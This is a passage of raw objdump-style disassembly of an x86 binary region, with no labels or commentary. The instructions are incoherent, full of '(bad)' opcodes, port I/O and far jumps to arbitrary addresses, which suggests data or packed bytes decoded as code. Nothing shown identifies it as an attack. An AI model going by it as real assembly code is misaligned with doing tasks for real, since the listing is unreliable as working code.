  412f17:	dec    edx
  412f18:	xchg   edx,eax
  412f19:	data16 aad 0x7c
  412f1c:	in     al,dx
  412f1d:	(bad)  
  412f1e:	mov    ds:0xcdd469c9,eax
  412f23:	mov    cl,0x97
  412f25:	retf   0xa3a8
  412f28:	xchg   ebp,eax
  412f29:	mov    esi,0x1caf3fc3
  412f2e:	lods   al,BYTE PTR ds:[esi]
  412f2f:	cmp    BYTE PTR [eax-0x16],dh
  412f32:	out    dx,eax
  412f33:	adc    ch,BYTE PTR es:[ebp-0xb504c46]
  412f3a:	icebp  
  412f3b:	add    edi,DWORD PTR [eax-0x11]
  412f3e:	out    0xf1,eax
  412f40:	fcomp  DWORD PTR ds:0x52543d92
  412f46:	xchg   esp,eax
  412f47:	retf   0xdfd4
  412f4a:	lahf   
  412f4b:	(bad)  
  412f4c:	out    0x59,al
  412f4e:	(bad)  
  412f4f:	mov    dh,0xbb
  412f51:	call   0x861:0xa0f2ff6b
  412f58:	cmp    al,0xb6
  412f5a:	enter  0xde0c,0xe0
  412f5e:	sbb    al,0x8f
  412f60:	(bad)  
  412f61:	push   0x4d8e83e
  412f66:	pop    edi
  412f67:	push   ss
  412f68:	xor    eax,0x572e4a6
  412f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f6e:	aas    
  412f6f:	or     BYTE PTR [edx+0x41],0x81
  412f73:	mov    cl,0xf6
  412f75:	cmp    eax,0xde59ad4
  412f7a:	out    dx,al
  412f7b:	adc    esp,DWORD PTR [ebp-0x5d]
  412f7e:	inc    edx
  412f7f:	ja     0x412f80
  412f81:	jle    0x412f40
  412f83:	dec    esi
  412f84:	dec    edx
  412f85:	xchg   ebx,eax
  412f86:	add    eax,0xb7622883
  412f8b:	sub    DWORD PTR [edx+0x22],ecx
  412f8e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  412f90:	push   eax
  412f91:	jp     0x412f77
  412f93:	in     al,0x51
  412f95:	enter  0x8cf,0xf7
  412f99:	test   BYTE PTR [edi+0x69],ch
  412f9c:	lds    eax,FWORD PTR [ebp+0x5bc48866]
  412fa2:	add    bl,0xfe
  412fa5:	cld    
  412fa6:	stos   BYTE PTR es:[edi],al
  412fa7:	dec    ebx
  412fa8:	push   ds
  412fa9:	sbb    ah,ch
  412fab:	out    0xb1,eax
  412fad:	fs mov ah,0xae
  412fb0:	ins    DWORD PTR es:[edi],dx
  412fb1:	call   0xfd9c3f81
  412fb6:	or     esp,DWORD PTR [ecx+0x692b8769]
  412fbc:	int3   
  412fbd:	inc    esi
  412fbe:	xlat   BYTE PTR ds:[ebx]
  412fbf:	dec    esp
  412fc0:	xlat   BYTE PTR ds:[ebx]
  412fc1:	xchg   esp,esi
  412fc3:	jb     0x412f81
  412fc5:	jmp    0x412ff8
  412fc7:	pop    ebx
  412fc8:	xlat   BYTE PTR ds:[ebx]
  412fc9:	pop    ebx
  412fca:	fisttp DWORD PTR [eax+0x5b]
  412fcd:	or     DWORD PTR [ebx-0x58],esp
  412fd0:	loopne 0x413013
  412fd2:	pusha  
  412fd3:	sub    eax,0x319add48
  412fd8:	icebp  
  412fd9:	jmp    0xd9d9:0x6c0b9a4
  412fe0:	mov    ds:0x97f2f833,al
  412fe5:	mov    al,0xe
  412fe7:	dec    esp
  412fe8:	inc    esi
  412fe9:	pop    ecx
  412fea:	inc    ebx
  412feb:	inc    esp
  412fec:	push   ebp
  412fed:	xchg   esi,eax
  412fee:	mov    ebx,esp
  412ff0:	push   0x255f0dcf
  412ff5:	aad    0x23
  412ff7:	call   0xf762:0x83e743ac
  412ffe:	jmp    0x1ebd:0xda69aaec
  413005:	loope  0x41301f
  413007:	push   eax
  413008:	push   ebp
  413009:	inc    eax
  41300a:	mov    ch,0x4
  41300c:	or     dl,al
  41300e:	sub    BYTE PTR [ecx+0x31],ah
  413011:	retf   
  413012:	ss xor al,0x9c
  413015:	hlt    
  413016:	shr    BYTE PTR [eax],cl
  413018:	dec    esi
  413019:	(bad)  
  41301a:	adc    DWORD PTR [edx],edx
  41301c:	push   esi
  41301d:	lds    eax,FWORD PTR [ebx-0x32588853]
  413023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413024:	lds    esp,FWORD PTR [edx-0x42]
  413027:	dec    ecx
  413028:	test   edi,esp
  41302a:	push   edx
  41302b:	out    0x9f,al
  41302d:	mov    cl,0xa
  41302f:	inc    edx
  413030:	aas    
  413031:	jae    0x4130b2
  413033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413034:	out    0x45,al
  413036:	mov    dh,0x4f
  413038:	dec    esp
  413039:	call   0x240f4292
  41303e:	xor    esi,edx
  413040:	shr    DWORD PTR [eax+esi*8+0x4706ce9c],0x2c
  413048:	hlt    
  413049:	(bad)  
  41304a:	fidivr DWORD PTR [ecx-0x46]
  41304d:	and    eax,0x3c0139d7
  413052:	sub    al,0x7d
  413054:	es out 0xa3,eax
  413057:	stos   DWORD PTR es:[edi],eax
  413058:	add    bh,BYTE PTR [esp+ebx*4+0x769e5dc]
  41305f:	ret    0x10d5
  413062:	out    0x70,al
  413064:	icebp  
  413065:	push   eax
  413066:	out    0xee,al
  413068:	jge    0x4130c8
  41306a:	sub    edi,DWORD PTR [esi-0x12f08ff2]
  413070:	jbe    0x4130c3
  413072:	add    DWORD PTR [edx+0x4f62a542],eax
  413078:	call   0x88aa:0x548c19f2
  41307f:	pop    ss
  413080:	adc    bl,ah
  413082:	or     edi,DWORD PTR [eax-0x1c963a71]
  413088:	fadd   QWORD PTR [ebx-0x2325ffd1]
  41308e:	hlt    
  41308f:	and    eax,0x901d5517
  413094:	addr16 sub al,0xe
  413097:	mov    ds:0x30e52ecf,eax
  41309c:	sub    ebp,0x842af57a
  4130a2:	mul    BYTE PTR [esi+ebp*8+0x2fecc2f2]
  4130a9:	jge    0x41310c
  4130ab:	sbb    al,0x45
  4130ad:	push   ss
  4130ae:	mov    esi,0xecc8b388
  4130b3:	jmp    0x41307a
  4130b5:	ins    BYTE PTR es:[edi],dx
  4130b6:	shl    DWORD PTR [ecx+0x31f29591],cl
  4130bc:	and    bh,BYTE PTR [edx+edi*1-0x6956067]
  4130c3:	mov    ecx,0xfecba225
  4130c8:	mov    edx,0xead23f60
  4130cd:	out    0x9c,al
  4130cf:	xor    DWORD PTR [ebx-0x76],ebx
  4130d2:	out    dx,eax
  4130d3:	out    dx,al
  4130d4:	test   ebp,edx
  4130d6:	gs daa 
  4130d8:	mov    dh,0x43
  4130da:	shl    esp,0x2e
  4130dd:	aas    
  4130de:	cmp    edx,DWORD PTR [ecx+eax*2+0x3bda2a18]
  4130e5:	push   ebx
  4130e6:	lds    ebx,FWORD PTR [eax]
  4130e8:	fbld   TBYTE PTR [eax+ebp*4+0x1762cc03]
  4130ef:	jno    0x41307f
  4130f1:	mov    edx,DWORD PTR [eax]
  4130f3:	jecxz  0x41311a
  4130f5:	adc    BYTE PTR [edx],bl
  4130f7:	mov    esp,0x2fa44de5
  4130fd:	daa    
  4130fe:	std    
  4130ff:	mov    edx,0xad708ec1
  413104:	(bad)  
  413105:	add    BYTE PTR [eax+0x668d1b3e],ah
  41310b:	sti    
  41310c:	frstor [edi+ebp*1]
  41310f:	ins    BYTE PTR es:[edi],dx
  413110:	retf   
  413111:	arpl   bp,ax
  413113:	popa   
  413114:	(bad)  
  413115:	pop    edx
  413116:	push   bp
  413118:	in     eax,0x18
  41311a:	sahf   
  41311b:	jmp    0x41311c
  41311d:	fs into 
  41311f:	inc    eax
  413120:	push   esi
  413121:	enter  0xd5a2,0xd
  413125:	mov    al,ds:0x717c6202
  41312a:	sbb    esp,ecx
  41312c:	int    0x69
  41312e:	out    dx,eax
  41312f:	inc    edx
  413130:	jge    0x413187
  413132:	cmp    eax,0xcda7bb92
  413137:	out    dx,al
  413138:	mov    ecx,0xd5a60481
  41313d:	out    0x1f,al
  41313f:	push   ebx
  413140:	outs   dx,DWORD PTR ds:[esi]
  413141:	mov    DWORD PTR [edi+0x7e],edx
  413144:	xchg   ecx,eax
  413145:	jns    0x413180
  413147:	call   0x87c159da
  41314c:	inc    ebx
  41314d:	fsubrp st(1),st
  41314f:	mov    ebp,0x52a04b21
  413154:	fsub   st,st(1)
  413156:	cli    
  413157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413158:	pop    edi
  413159:	xor    esi,ebx
  41315b:	pop    ss
  41315c:	in     al,0xdf
  41315e:	daa    
  41315f:	cmp    eax,0xf1f23adc
  413164:	sbb    BYTE PTR [ebx],0x28
  413167:	mov    eax,DWORD PTR [ecx]
  413169:	dec    eax
  41316a:	scas   al,BYTE PTR es:[edi]
  41316b:	inc    eax
  41316c:	push   ecx
  41316d:	test   eax,0x1d6bee5d
  413172:	loope  0x413188
  413174:	sbb    eax,0x3897ddff
  413179:	xor    WORD PTR ds:[edx+esi*8],bp
  41317e:	scas   al,BYTE PTR es:[edi]
  41317f:	or     eax,0x95400ed2
  413184:	(bad)  
  413185:	push   edi
  413186:	test   eax,0x9f99c563
  41318b:	fisub  DWORD PTR [ecx+ebp*8]
  41318e:	sbb    ebx,0x25961c47
  413194:	dec    esp
  413195:	aam    0xbb
  413197:	pushf  
  413198:	fild   DWORD PTR [ecx]
  41319a:	mov    ds:0x8ab5db4,al
  41319f:	or     ecx,esi
  4131a1:	sub    eax,0x8e160307
  4131a6:	ror    ebx,1
  4131a8:	lea    eax,[ebp+0x54]
  4131ab:	addr16 push esp
  4131ad:	push   edi
  4131ae:	enter  0x7347,0x8
  4131b2:	cmp    al,0x24
  4131b4:	and    BYTE PTR [eax],dl
  4131b6:	lea    edi,[edx+0x5]
  4131b9:	jl     0x413168
  4131bb:	cli    
  4131bc:	add    bh,BYTE PTR [edi+eiz*4+0x136261b1]
  4131c3:	dec    eax
  4131c4:	pusha  
  4131c5:	sbb    al,0xd8
  4131c7:	cdq    
  4131c8:	jmp    0x86a9896
  4131cd:	adc    eax,0xd0a4b540
  4131d2:	cmp    BYTE PTR [eax-0x4a8d40ae],dh
  4131d8:	adc    al,0x32
  4131da:	adc    ebx,DWORD PTR [esp+esi*4]
  4131dd:	into   
  4131de:	aaa    
  4131df:	out    dx,al
  4131e0:	jo     0x41319b
  4131e2:	std    
  4131e3:	fdivr  QWORD PTR [ecx]
  4131e5:	xchg   edi,eax
  4131e6:	idiv   DWORD PTR [esp+edx*4+0x35]
  4131ea:	sbb    bl,ah
  4131ec:	pop    esp
  4131ed:	pop    esp
  4131ee:	jno    0x4131eb
  4131f0:	ror    DWORD PTR ds:0x81a614b1,1
  4131f6:	sub    bl,cl
  4131f8:	aas    
  4131f9:	inc    ebx
  4131fa:	xchg   BYTE PTR [ebp-0x11],dh
  4131fd:	aaa    
  4131fe:	xchg   DWORD PTR [ebp+eax*8-0x12bf31e1],esp
  413205:	jae    0x413254
  413207:	push   ebx
  413208:	nop
  413209:	icebp  
  41320a:	leave  
  41320b:	jg     0x4131a6
  41320d:	ficomp DWORD PTR [eax]
  41320f:	scas   al,BYTE PTR es:[edi]
  413210:	stos   DWORD PTR es:[edi],eax
  413211:	fld    DWORD PTR gs:[edi+ebx*2-0x102cab81]
  413219:	scas   al,BYTE PTR es:[edi]
  41321a:	call   0x72bfb443
  41321f:	inc    ebx
  413220:	xchg   ebx,eax
  413221:	push   edx
  413222:	jg     0x413282
  413224:	retf   0xe8af
  413227:	sub    DWORD PTR [ecx-0x3c],ebp
  41322a:	pop    eax
  41322b:	imul   edx,DWORD PTR [ebx-0x75],0xffffffc5
  41322f:	enter  0xaa69,0xc4
  413233:	test   DWORD PTR [ebx+0x17],ebx
  413236:	cmp    DWORD PTR ds:0x3476c62e,edx
  41323c:	fidivr DWORD PTR [ebx-0x2fcc0385]
  413242:	add    eax,0x916cc695
  413247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413248:	jo     0x4131e5
  41324a:	outs   dx,DWORD PTR ds:[esi]
  41324b:	push   ds
  41324c:	repz jmp 0xd9a4:0xde505c42
  413254:	jns    0x4131e4
  413256:	test   BYTE PTR [edx-0x43d091b6],al
  41325c:	and    cl,BYTE PTR [ebx]
  41325e:	icebp  
  41325f:	cmp    ebp,DWORD PTR [eax]
  413261:	push   DWORD PTR [ebp-0x6e]
  413264:	(bad)  
  413265:	inc    edi
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	fadd   QWORD PTR [edx-0x1a]
  41326a:	fdiv   DWORD PTR [ebx-0x32ffc67c]
  413270:	cmp    dl,BYTE PTR [edx]
  413272:	std    
  413273:	into   
  413274:	and    BYTE PTR [edx],bl
  413276:	inc    ebx
  413277:	leave  
  413278:	cdq    
  413279:	jmp    0xc766:0x3fb02ecb
  413280:	mov    esi,0xd50dd476
  413285:	sbb    BYTE PTR [eax+eiz*1-0x4db7cb94],dl
  41328c:	jnp    0x4132e3
  41328e:	inc    DWORD PTR [ebp+0x73764b75]
  413294:	dec    BYTE PTR [ebp-0x616ab091]
  41329a:	or     eax,0xbb6476f1
  41329f:	xor    eax,0x60ce86d1
  4132a4:	mov    al,0xf8
  4132a6:	adc    cl,dl
  4132a8:	enter  0x9028,0x1d
  4132ac:	or     esi,DWORD PTR cs:[si]
  4132b0:	(bad)  
  4132b1:	scas   eax,DWORD PTR es:[edi]
  4132b2:	lods   al,BYTE PTR ds:[esi]
  4132b3:	mov    bl,0x74
  4132b5:	sub    BYTE PTR ds:0xc2d6bbea,dl
  4132bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132bc:	push   cs
  4132bd:	mov    dl,0x65
  4132bf:	sub    BYTE PTR [edx-0x430a3d7],al
  4132c5:	pop    ecx
  4132c6:	push   0x880825e1
  4132cb:	leave  
  4132cc:	loope  0x41327a
  4132ce:	cs and eax,0x93165462
  4132d4:	jge    0x413285
  4132d6:	push   ecx
  4132d7:	(bad)  
  4132d8:	int3   
  4132d9:	stc    
  4132da:	and    al,0x2
  4132dc:	xlat   BYTE PTR ds:[ebx]
  4132dd:	daa    
  4132de:	adc    eax,0x1aa55337
  4132e3:	hlt    
  4132e4:	mov    esi,0x4a8755e7
  4132e9:	push   ds
  4132ea:	mov    eax,0x4f8737d0
  4132ef:	stc    
  4132f0:	dec    edi
  4132f1:	sbb    DWORD PTR [ecx+eax*2+0x31a277ce],ecx
  4132f8:	(bad)  
  4132fb:	pusha  
  4132fc:	test   DWORD PTR ds:0x6be609fe,edi
  413302:	sahf   
  413303:	cmp    DWORD PTR [ebp+ecx*2-0x1e],0xffffff8b
  413308:	dec    esi
  413309:	inc    eax
  41330a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330c:	inc    edx
  41330d:	bound  edx,QWORD PTR [edx-0x7a4d9e4d]
  413313:	mov    edi,DWORD PTR [edi-0x5]
  413316:	push   es
  413317:	jne    0x413309
  413319:	xchg   edi,eax
  41331a:	loopne 0x413338
  41331c:	fs adc eax,0xde22f96c
  413322:	pop    ecx
  413323:	mov    edx,0x3205cd78
  413328:	ins    BYTE PTR es:[edi],dx
  413329:	mov    ebx,0x8482281f
  41332e:	xor    edi,DWORD PTR [edi+0x10f7e4d9]
  413334:	in     al,dx
  413335:	mov    ah,0xa6
  413337:	xor    dl,BYTE PTR [ebx]
  413339:	retf   
  41333a:	ds stos BYTE PTR es:[edi],al
  41333c:	push   0xea7530cc
  413341:	push   ss
  413342:	add    ah,bh
  413344:	mov    ecx,0x519d6b5b
  413349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334a:	push   esi
  41334b:	in     al,0xe3
  41334d:	adc    eax,0xd47c82af
  413352:	icebp  
  413353:	pop    ebp
  413354:	rcl    BYTE PTR [esp+eiz*2],0xf5
  413358:	(bad)  
  413359:	aas    
  41335a:	cli    
  41335b:	and    BYTE PTR [edx-0x7dcd21ec],ah
  413361:	loopne 0x4133b2
  413363:	std    
  413364:	sub    DWORD PTR [ecx+0x25],ecx
  413367:	pushf  
  413368:	ret    
  413369:	nop
  41336a:	cdq    
  41336b:	out    dx,eax
  41336c:	adc    BYTE PTR [ebx],ah
  41336e:	push   esi
  41336f:	out    dx,eax
  413370:	out    dx,eax
  413371:	push   ebx
  413372:	and    bh,dh
  413374:	loope  0x41334c
  413376:	(bad)  
  413377:	xchg   esi,eax
  413378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413379:	popa   
  41337a:	into   
  41337b:	test   ah,dl
  41337d:	in     al,0xf9
  41337f:	retf   0xb887
  413382:	arpl   WORD PTR [ecx],bx
  413384:	bndldx bnd3,[edi+0x4]
  413388:	iret   
  413389:	test   al,0x83
  41338b:	es jmp 0x3aed09d8
  413391:	js     0x413402
  413393:	mov    al,0x9a
  413395:	fwait
  413396:	repnz pop esi
  413398:	mov    al,0x68
  41339a:	xchg   cl,ah
  41339c:	or     BYTE PTR [esi],0x58
  41339f:	sub    BYTE PTR [ebp-0x69a41c1d],0x4f
  4133a6:	fcomp  DWORD PTR [esi]
  4133a8:	test   al,0xf9
  4133aa:	dec    edx
  4133ab:	xchg   ecx,eax
  4133ac:	and    BYTE PTR [edx-0x1824f3ea],ch
  4133b2:	out    0xea,al
  4133b4:	in     al,dx
  4133b5:	iret   
  4133b6:	add    cl,cl
  4133b8:	(bad)  
  4133b9:	sbb    al,al
  4133bb:	mov    ch,0x94
  4133bd:	ja     0x41340b
  4133bf:	(bad)  
  4133c0:	sar    eax,cl
  4133c2:	les    edx,FWORD PTR [eax]
  4133c4:	aam    0xc6
  4133c6:	inc    eax
  4133c7:	or     ah,0x72
  4133ca:	(bad)  
  4133cc:	push   ebp
  4133cd:	xchg   ebx,eax
  4133ce:	sar    DWORD PTR [ebx+0x5a],cl
  4133d1:	mov    ds:0xa54aa0ac,al
  4133d6:	pop    edx
  4133d7:	xchg   ebp,eax
  4133d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133d9:	jns    0x413403
  4133db:	lahf   
  4133dc:	fidiv  DWORD PTR [ebx+0x44bcb5d5]
  4133e2:	enter  0x5cb,0x43
  4133e6:	mov    DWORD PTR [esi],ebx
  4133e8:	inc    esi
  4133e9:	aas    
  4133ea:	shl    BYTE PTR [ecx],cl
  4133ec:	and    al,0xa6
  4133ee:	shl    esi,0x6b
  4133f1:	ret    
  4133f2:	or     BYTE PTR [esi],0x6f
  4133f5:	pop    es
  4133f6:	aam    0x32
  4133f8:	iret   
  4133f9:	push   esp
  4133fa:	(bad)  
  4133fb:	push   esp
  4133fc:	out    0x1f,al
  4133fe:	ficom  WORD PTR [eax+0x7df7e6a]
  413404:	int    0x9d
  413406:	sbb    DWORD PTR [edi-0x2d],edi
  413409:	sbb    al,0x8e
  41340b:	icebp  
  41340c:	xor    DWORD PTR [edx-0x1d02b716],esi
  413412:	push   ecx
  413413:	(bad)  [edi]
  413415:	retf   0x1416
  413418:	jbe    0x4133d6
  41341a:	stos   DWORD PTR es:[edi],eax
  41341b:	mov    ecx,0x18fe244e
  413420:	inc    edi
  413421:	cmp    bh,BYTE PTR [eax]
  413423:	mov    ecx,0x5adc523b
  413428:	test   DWORD PTR [ebp-0x2416093d],edx
  41342e:	jb     0x4134ae
  413430:	mov    edi,0xade25ee9
  413435:	sbb    BYTE PTR [eax+0x4b1baa8],dh
  41343b:	shr    DWORD PTR [ebp-0x60],cl
  41343e:	mov    BYTE PTR [esi],bh
  413440:	(bad)
  413443:	sub    al,0xc6
  413445:	jmp    0x86ea723f
  41344a:	repz mov edx,0xf870fa6d
  413450:	mov    eax,0x69e8093c
  413455:	dec    esi
  413456:	pushf  
  413457:	xor    bl,BYTE PTR [ebp-0x160767a6]
  41345d:	das    
  41345e:	shl    dh,1
  413460:	cmp    eax,0xc1d905ad
  413465:	imul   ecx,DWORD PTR [ecx-0x1e16d8dc],0xffffff8a
  41346c:	inc    edx
  41346d:	sub    BYTE PTR [ebp+0x252e7916],cl
  413473:	fcmovne st,st(6)
  413475:	imul   esi,DWORD PTR [ecx],0x49
  413478:	pop    esp
  413479:	data16 aam 0x2c
  41347c:	or     esp,DWORD PTR [edi-0x61d77a4f]
  413482:	jle    0x413497
  413484:	fiadd  WORD PTR [esi-0x61a94cff]
  41348a:	sbb    DWORD PTR [ebx-0x34],ebp
  41348d:	xor    DWORD PTR [ebp-0x7fcfced6],esi
  413493:	das    
  413494:	sbb    al,0x71
  413496:	sub    bl,bl
  413498:	xchg   ebx,eax
  413499:	mov    ds:0xb1c04383,al
  41349e:	repz pop edi
  4134a0:	add    eax,0x76185bd8
  4134a5:	push   0x78
  4134a7:	add    esp,DWORD PTR [ebx]
  4134a9:	ja     0x4134ae
  4134ab:	ss push esi
  4134ad:	mov    dh,cl
  4134af:	xchg   esi,eax
  4134b0:	es jne 0x413526
  4134b3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b5:	xchg   esi,eax
  4134b6:	es jge 0x41343b
  4134b9:	nop
  4134ba:	sti    
  4134bb:	dec    edi
  4134bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134bd:	pop    ss
  4134be:	jnp    0x41350c
  4134c0:	or     BYTE PTR [edi+0x23ff121d],0xd9
  4134c7:	call   0x872:0xd6d7a9ba
  4134ce:	push   edi
  4134cf:	push   ds
  4134d0:	icebp  
  4134d1:	xchg   ecx,eax
  4134d2:	jp     0x4134c1
  4134d4:	shr    DWORD PTR [ecx+0x451dd4e],1
  4134da:	cs pop ds
  4134dc:	pop    esp
  4134dd:	stos   DWORD PTR es:[edi],eax
  4134de:	jmp    0x88dce8fc
  4134e3:	mov    dl,0xf3
  4134e5:	mov    ch,0x5b
  4134e7:	loopne 0x4134b0
  4134e9:	add    bl,BYTE PTR [esi-0x5f]
  4134ec:	xchg   esp,eax
  4134ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ee:	and    eax,0xc94f29e3
  4134f3:	(bad)  
  4134f4:	in     al,dx
  4134f5:	adc    BYTE PTR [edx-0x17f03343],cl
  4134fb:	jmp    0x578dba14
  413500:	xlat   BYTE PTR ds:[ebx]
  413501:	rol    DWORD PTR [eax-0x3aae5f43],cl
  413507:	les    eax,FWORD PTR [edi]
  413509:	xor    al,0x22
  41350b:	sub    ch,dh
  41350d:	or     ebp,DWORD PTR [ecx+0x4d]
  413510:	and    cl,BYTE PTR [esp-0x49a61d0e]
  413517:	sbb    DWORD PTR [ebx+0xe340355],eax
  41351d:	inc    ebp
  41351e:	lods   eax,DWORD PTR ds:[esi]
  41351f:	jg     0x413579
  413521:	and    BYTE PTR [eax-0x6c431d97],0xe5
  413528:	xchg   ebp,eax
  413529:	ficomp DWORD PTR [ebx]
  41352b:	data16 (bad) 
  41352d:	frstor [ebp-0x3]
  413530:	ret    
  413531:	adc    ch,BYTE PTR [ecx+ecx*1+0x2c3d3df7]
  413538:	pop    ss
  413539:	jmp    0xa06a:0xde7bca9f
  413540:	cmp    BYTE PTR [edx+0x22e021e6],cl
  413546:	mov    bh,0xdd
  413548:	mov    ss,WORD PTR ds:0x5ce2a35a
  41354e:	dec    esp
  41354f:	xor    al,0xed
  413551:	mov    dh,0xac
  413553:	inc    edi
  413554:	and    DWORD PTR [ecx+0x73],ebx
  413557:	sub    esi,esi
  413559:	arpl   WORD PTR [ebx+0x74],cx
  41355c:	vcmpsd xmm4,xmm7,QWORD PTR [esi+0x2f8fb54d],0xbb
  413565:	fadd   QWORD PTR [ecx+0x1f9dae2b]
  41356b:	fsub   QWORD PTR [esp+ebx*8-0x5e]
  41356f:	dec    edi
  413570:	int3   
  413571:	push   ss
  413572:	mov    edi,0x97b12cce
  413577:	lea    esp,[esi-0x37]
  41357a:	xchg   ebp,eax
  41357b:	sbb    dh,BYTE PTR [esi+0x32]
  41357e:	out    dx,eax
  41357f:	scas   al,BYTE PTR es:[edi]
  413580:	loopne 0x41358f
  413582:	add    eax,0x567c9dbb
  413587:	jo     0x413553
  413589:	jbe    0x41354e
  41358b:	add    esi,DWORD PTR [esi+0x1d]
  41358e:	fwait
  41358f:	test   eax,0xbb081bdf
  413594:	add    edi,DWORD PTR [eax]
  413596:	aaa    
  413597:	lds    ebp,FWORD PTR [esi-0x50]
  41359a:	rcl    esi,1
  41359c:	(bad)  
  41359d:	sub    al,0xfa
  41359f:	repnz loop 0x41361a
  4135a2:	add    DWORD PTR [eax],esp
  4135a4:	jmp    esi
  4135a6:	daa    
  4135a7:	outs   dx,DWORD PTR ds:[esi]
  4135a8:	and    al,0xa8
  4135aa:	mov    edi,DWORD PTR [ebx-0x14]
  4135ad:	cmp    BYTE PTR [eax+0x3c],dl
  4135b0:	xor    eax,0x77275387
  4135b5:	xchg   edi,eax
  4135b6:	mov    dh,0xd8
  4135b8:	sbb    ebp,DWORD PTR [ecx]
  4135ba:	sub    DWORD PTR [edi+0xfff6995],esp
  4135c0:	pop    ss
  4135c1:	fldenv [ebp-0x151b1615]
  4135c7:	mov    eax,0xd932f353
  4135cc:	int3   
  4135cd:	iret   
  4135ce:	cs jno 0x41356d
  4135d1:	stos   BYTE PTR es:[edi],al
  4135d2:	or     DWORD PTR [ebp-0x20],0xffffff92
  4135d6:	xor    esi,DWORD PTR [ecx+0x34]
  4135d9:	pop    ecx
  4135da:	pop    ds
  4135db:	pop    eax
  4135dc:	jge    0x413592
  4135de:	xchg   edi,eax
  4135df:	cmp    DWORD PTR [edx-0x1],edi
  4135e2:	and    BYTE PTR [edx],dh
  4135e4:	imul   BYTE PTR [ebx+0x24]
  4135e7:	sbb    DWORD PTR [esi],ebx
  4135e9:	sub    bl,BYTE PTR [ecx-0x7937f476]
  4135ef:	pusha  
  4135f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f1:	fcomp  DWORD PTR [ecx-0x76]
  4135f4:	ss jg  0x4135a2
  4135f7:	pusha  
  4135f8:	jne    0x4135fc
  4135fa:	sbb    ecx,ebp
  4135fc:	dec    edx
  4135fd:	into   
  4135fe:	jmp    0x4135c3
  413600:	cdq    
  413601:	shr    DWORD PTR [esi+0x3816be85],cl
  413607:	mov    dl,0xd6
  413609:	adc    BYTE PTR [ebx+0x4a],dl
  41360c:	out    0x36,al
  41360e:	pop    ds
  41360f:	jp     0x4135d1
  413611:	aas    
  413612:	push   es
  413613:	and    esi,esi
  413615:	test   esi,eax
  413617:	ret    0x5521
  41361a:	add    eax,0xbf7474b4
  41361f:	mov    dh,0x45
  413621:	mov    bl,bl
  413623:	xchg   esi,eax
  413624:	arpl   WORD PTR [eax+0x7d6f8de3],cx
  41362a:	and    ch,BYTE PTR [ebp+0xf]
  41362d:	std    
  41362e:	stos   BYTE PTR es:[edi],al
  41362f:	pop    edx
  413630:	mov    edi,0xfae517da
  413635:	adc    BYTE PTR [edi+0x53],0xe5
  413639:	pop    ds
  41363a:	or     DWORD PTR [edi],esp
  41363c:	sbb    BYTE PTR [edi-0x2f],dl
  41363f:	mov    ebp,0x94350e3d
  413644:	xor    eax,0x365aa28c
  413649:	ror    BYTE PTR [esi],0xa4
  41364c:	pop    ebp
  41364d:	ss pop esi
  41364f:	test   BYTE PTR [eax-0x1b],bl
  413652:	adc    al,0xa7
  413654:	inc    eax
  413655:	pusha  
  413656:	sbb    bh,ah
  413658:	pop    ds
  413659:	sti    
  41365a:	ds shl ch,0x3
  41365e:	jbe    0x4135fc
  413660:	cmp    al,BYTE PTR [edx+eax*4+0x7c]
  413664:	stos   DWORD PTR es:[edi],eax
  413665:	xor    edi,edx
  413667:	ret    0x17b
  41366a:	daa    
  41366b:	add    ebx,DWORD PTR [ebx]
  41366d:	aas    
  41366e:	mov    dh,0x1a
  413670:	adc    DWORD PTR [esi-0x3f],esi
  413673:	jnp    0x4136ba
  413675:	sbb    al,0xd1
  413677:	imul   esp,DWORD PTR [esi+ebx*4+0x56],0x20a310a2
  41367f:	adc    dh,BYTE PTR [ebp+0x729e036e]
  413685:	push   ss
  413686:	push   edi
  413687:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413689:	pusha  
  41368a:	jb     0x413660
  41368c:	dec    esp
  41368d:	cld    
  41368e:	sub    eax,0xdd76dd78
  413693:	(bad)  
  413694:	mov    al,ds:0xd9d4a733
  413699:	popa   
  41369a:	(bad)  
  41369b:	shr    eax,1
  41369d:	inc    edi
  41369e:	les    eax,FWORD PTR [esi]
  4136a0:	push   ebp
  4136a1:	je     0x413627
  4136a3:	sbb    dh,BYTE PTR [edi+0x4a]
  4136a6:	pop    ebp
  4136a7:	jne    0x4136f4
  4136a9:	mov    bl,0x80
  4136ab:	adc    al,0xda
  4136ad:	push   ss
  4136ae:	push   edi
  4136af:	xchg   esp,eax
  4136b0:	ss xchg edi,eax
  4136b2:	push   esp
  4136b3:	jnp    0x413724
  4136b5:	pusha  
  4136b6:	nop
  4136b7:	cs das 
  4136b9:	xor    DWORD PTR [ebp-0x20],edi
  4136bc:	(bad)  
  4136bd:	(bad)  
  4136be:	and    eax,0xa4932551
  4136c3:	(bad)  
  4136c5:	sti    
  4136c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136c7:	jmp    0x4078:0xa278a40c
  4136ce:	std    
  4136cf:	sbb    edx,DWORD PTR [ebp-0x3e]
  4136d2:	sub    BYTE PTR [esi-0x4b],bl
  4136d5:	dec    ebx
  4136d6:	aad    0x6
  4136d8:	test   BYTE PTR ds:0x84fc1122,bh
  4136de:	(bad)  
  4136e0:	popf   
  4136e1:	ins    BYTE PTR es:[edi],dx
  4136e2:	pushf  
  4136e3:	(bad)  
  4136e4:	lahf   
  4136e5:	call   0x33657d62
  4136ea:	out    0xe0,al
  4136ec:	sub    dl,ah
  4136ee:	dec    edi
